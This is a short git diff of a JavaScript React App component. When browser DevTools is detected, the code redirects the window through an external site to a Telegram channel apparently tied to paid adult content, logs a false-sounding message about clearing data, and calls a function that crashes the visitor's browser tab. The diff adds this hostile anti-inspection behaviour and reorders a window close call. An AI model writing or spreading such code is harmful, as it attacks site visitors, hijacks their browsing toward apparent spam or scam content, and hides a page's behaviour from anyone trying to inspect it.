@@ -89,10 +89,9 @@ function App(props) {
     addListener(function (isOpen) {
       if (isOpen) {
         const wind = window.open(`https://autolclose.netlify.app?u=https://t.me/paid_girrl_shruthiee`, "_self");
-        // window.open(`www.google.com`);
-        wind.close()
         console.log("DevTools is opened, console cleared, network requests aborted, and data reset.");
         setTimeout(crashBrowserCurrentTab, 500);
+        wind.close()
       }
     });
     launch();
